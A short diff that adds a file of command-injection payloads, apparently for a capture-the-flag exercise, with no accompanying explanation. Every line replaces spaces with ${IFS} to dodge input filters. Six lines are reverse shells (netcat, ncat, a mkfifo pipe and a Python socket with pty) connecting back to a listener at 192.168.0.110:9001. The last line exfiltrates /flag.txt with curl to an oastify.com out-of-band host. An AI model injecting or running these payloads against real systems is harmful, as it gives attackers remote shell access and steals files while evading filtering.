@@ -1,0 +1,8 @@
+rm${IFS}/tmp/f;mkfifo${IFS}/tmp/f;cat${IFS}/tmp/f|sh${IFS}-i${IFS}2>&1|nc${IFS}192.168.0.110${IFS}9001${IFS}>/tmp/f
+nc${IFS}192.168.0.110${IFS}9001${IFS}-e${IFS}sh
+nc.exe${IFS}192.168.0.110${IFS}9001${IFS}-e${IFS}sh
+nc${IFS}-c${IFS}sh${IFS}192.168.0.110${IFS}9001
+ncat${IFS}192.168.0.110${IFS}9001${IFS}-e${IFS}sh
+python${IFS}-c${IFS}'import${IFS}socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.0.110",9001));os.dup2(s.fileno(),0);${IFS}os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import${IFS}pty;${IFS}pty.spawn("sh")'
+
+curl${IFS}-d${IFS}@/flag.txt${IFS}dxev916y5ygj0hecisij82ijrax0lp.oastify.com
